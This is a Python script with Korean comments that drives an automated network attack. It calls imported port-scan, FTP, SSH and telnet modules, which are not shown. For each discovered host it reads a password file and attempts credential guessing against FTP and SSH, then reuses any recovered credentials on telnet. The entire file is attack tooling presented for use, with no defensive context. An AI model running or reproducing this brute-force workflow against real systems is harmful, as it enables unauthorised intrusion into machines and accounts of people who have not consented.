import ftp, ssh, telnet, portscan
import time
        
def main():
    print('\n< 자동 공격을 실행합니다 >')
    try:
        tgtHosts = portscan.main() #호스트 및 포트스캔 후 결과 tgtHosts
    except:
        print(' => 호스트 스캔 및 포트스캔 중 오류가 발생하였습니다.')
    for tgtHost in tgtHosts: #각 호스트별로 for문
        print('\n'+tgtHost+'의 '+ str(tgtHosts[tgtHost])+'서비스에 대해서 공격을 시도합니다.')
        answer = input('\n => 계속하시겠습니까? (y or n): ')
        attack = []
        if answer == 'y': #공격시
            passwdFile = input(' => 패스워드 파일을 입력하세요 : ')
            username = ''
            password = ''
            if 'ftp' in tgtHosts[tgtHost]: #ftp 서비스가 있으면
                try: #공격
                    username, password = ftp.main(tgtHost,passwdFile)
                    attack.append('ftp')
                except: #오류 발생시
                    print(' => ftp 공격 실행 중 오류가 발생하였습니다.')
                    attack.append('ftp')
            if 'ssh' in tgtHosts[tgtHost]: #ssh 서비스가 있으면
                try: #공격
                    username, password = ssh.main(tgtHost, username, password,passwdFile)
                    attack.append('ssh')
                except: #오류 발생시
                    print(' => ssh 공격 실행 중 오류가 발생하였습니다.')
                    attack.append('ssh')
            if 'telnet' in tgtHosts[tgtHost]: #telnet 서비스가 있으면
                try: #공격
                    telnet.main(tgtHost, username, password)
                    attack.append('telnet')
                except: #오류 발생시
                    print(' => telnet 공격 실행 중 오류가 발생하였습니다.')
                    attack.append('telnet')
            print(' => '+tgtHost+' 에 대한 '+str(attack)+' 공격 시도를 완료했습니다.')
            #시도한 공격들에 대해 출력